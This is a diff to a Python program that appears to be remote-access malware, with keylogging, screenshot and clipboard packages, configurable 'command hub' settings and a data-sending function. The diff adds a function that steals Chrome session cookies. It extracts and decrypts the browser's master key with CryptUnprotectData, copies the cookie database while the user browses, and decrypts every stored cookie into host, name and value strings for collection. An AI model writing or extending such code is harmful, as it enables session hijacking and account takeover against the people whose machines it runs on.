@@ -88,7 +88,14 @@ except ImportError:
     psutil = None
     PSUTIL_AVAILABLE = False
 
-REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip']
+try:
+    import win32crypt
+    WIN32CRYPT_AVAILABLE = True
+except ImportError:
+    win32crypt = None
+    WIN32CRYPT_AVAILABLE = False
+
+REQUIRED_PACKAGES = ['pynput', 'pycryptodome', 'mss', 'Pillow', 'pyperclip', 'pywin32']
 
 # Default command hub settings. These values can be overridden by
 # environment variables KING_HUB_IP / KING_HUB_PORT or by passing
@@ -154,6 +161,44 @@ def get_arp_table():
         return output.decode('utf-8', errors='ignore')
     except Exception as e:
         return f'Failed to get ARP table: {e}'
+
+
+def get_session_data():
+    if not WIN32CRYPT_AVAILABLE or not CRYPTO_AVAILABLE:
+        return "Dependencies not available"
+    # Use environment variables to handle ANY machine's username
+    local = os.getenv('LOCALAPPDATA')
+    path = os.path.join(local, r"Google\Chrome\User Data\Local State")
+    db_path = os.path.join(local, r"Google\Chrome\User Data\Default\Network\Cookies")
+    
+    if not os.path.exists(db_path): return "No Path"
+
+    # 1. Master Key Extraction
+    with open(path, "r", encoding="utf-8") as f:
+        reg = json.load(f)
+    key = base64.b64decode(reg["os_crypt"]["encrypted_key"])[5:]
+    master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+    # 2. Database Migration (To avoid 'Locked' errors while Scholar is browsing)
+    temp_db = os.path.join(os.getenv('TEMP'), "vault.db")
+    shutil.copy2(db_path, temp_db)
+    
+    conn = sqlite3.connect(temp_db)
+    cursor = conn.cursor()
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    
+    cookies = []
+    for host, name, value in cursor.fetchall():
+        try:
+            iv, payload = value[3:15], value[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt(payload)[:-16].decode()
+            cookies.append(f"{host} | {name}: {decrypted}")
+        except: continue
+    
+    conn.close()
+    os.remove(temp_db)
+    return "\n".join(cookies)
 
 
 def send_atomic_data(s, type, data, filename, is_websocket=False):
